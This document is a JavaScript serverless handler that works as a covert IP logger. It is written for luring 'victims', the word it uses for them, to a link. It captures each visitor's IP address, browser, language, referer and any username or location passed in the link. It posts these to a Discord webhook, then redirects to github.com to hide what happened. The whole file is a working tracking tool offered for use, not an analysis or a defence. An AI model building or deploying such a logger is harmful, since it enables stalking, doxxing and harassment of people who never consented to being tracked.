export default async function handler(req, res) {
  // Get client information
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const acceptLanguage = req.headers['accept-language'];
  const referer = req.headers['referer'] || 'Direct';
  
  // Get additional info from query params (if victim clicks a link)
  const { username, location, custom } = req.query;
  
  const victimData = {
    timestamp: new Date().toISOString(),
    ip: ip,
    userAgent: userAgent,
    language: acceptLanguage,
    referer: referer,
    additional: {
      username: username || 'Unknown',
      location: location || 'Unknown', 
      custom: custom || 'None'
    }
  };
  
  // Send to Discord webhook
  await sendToDiscord(victimData);
  
  // Redirect to a legit site or show fake content
  res.redirect(302, 'https://github.com');
}

async function sendToDiscord(victimData) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  
  const embed = {
    title: "🕵️ New Visitor Logged",
    color: 0xff0000,
    fields: [
      {
        name: "🌐 IP Address",
        value: `\`\`\`${victimData.ip}\`\`\``,
        inline: true
      },
      {
        name: "🕒 Time",
        value: `<t:${Math.floor(new Date(victimData.timestamp).getTime() / 1000)}:R>`,
        inline: true
      },
      {
        name: "🔍 User Agent",
        value: `\`\`\`${victimData.userAgent.substring(0, 100)}...\`\`\``
      },
      {
        name: "🗣️ Language",
        value: victimData.language || 'Unknown',
        inline: true
      },
      {
        name: "📎 Referer",
        value: victimData.referer,
        inline: true
      },
      {
        name: "👤 Username",
        value: victimData.additional.username,
        inline: true
      },
      {
        name: "📍 Location",
        value: victimData.additional.location,
        inline: true
      }
    ],
    footer: {
      text: "IP Logger • github.com/your-repo"
    }
  };
  
  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        embeds: [embed],
        username: "IP Logger Bot"
      })
    });
  } catch (error) {
    console.error('Discord webhook failed:', error);
  }
}
